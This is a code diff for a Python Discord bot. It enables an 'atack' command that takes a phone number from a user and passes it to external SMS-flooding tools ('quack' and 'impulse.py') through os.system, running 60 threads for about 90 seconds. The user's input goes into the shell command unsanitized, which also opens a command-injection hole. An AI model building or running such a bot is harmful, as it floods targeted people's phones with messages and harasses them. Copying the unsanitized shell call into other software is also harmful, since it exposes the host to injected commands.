@@ -13,16 +13,19 @@ async def on_ready():
 
 
 @bot.command()
-async def ping(ctx):
-   await ctx.send('pong')
+async def info(ctx):
+   embed3 = discord.Embed(title ="the number must be attached with the number prefix, example (*atack +573201233234)", color=0x00ff00)
+   await ctx.send(embed=embed3)
 
 
 @bot.command()
-async def atack(ctx):
+async def atack(ctx,arg):
       embed = discord.Embed(title ="the attack takes between 4-5 minutes", color=0x00ff00, timestamp=datetime.datetime.utcnow())
       await ctx.send(embed=embed)
-      #os.system("cd quack ; python3 quack --tool SMS --target  number --threads 60 --timeout 90")
-      #os.system("python3 impulse.py --method SMS --time 90 --threads 60 --target  number")
+      #atack
+      os.system(f"cd quack ; python3 quack --tool SMS --target  {arg} --threads 60 --timeout 90")
+      os.system(f"python3 impulse.py --method SMS --time 90 --threads 60 --target {arg} ")
+
       embed2 = discord.Embed(title ="atack completed! :skull:" ,color=0x00ff00,  timestamp=datetime.datetime.utcnow())
       await ctx.send(embed=embed2)
       
